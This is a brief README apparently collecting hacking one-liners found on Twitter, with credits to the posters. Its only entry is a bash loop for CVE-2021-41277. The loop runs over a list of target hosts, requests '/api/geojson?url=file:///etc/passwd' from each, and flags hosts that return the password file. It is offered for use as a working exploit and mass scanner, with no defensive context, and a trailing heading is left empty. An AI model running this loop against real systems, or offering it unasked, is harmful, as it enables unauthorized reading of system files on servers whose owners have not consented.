# Hacking scripts I found on twitter
- Just posting all the things i found on twitter with usernames for credit

## CVE-2021-41277 one liner by @HackerGautam
cat targets.txt| while read host do;do curl --silent --insecure --path-as-is "$host/api/geojson?url=file:///etc/passwd" | grep -qs "root:x" && echo "$host \033[0;31m Vulnerable";done

## 
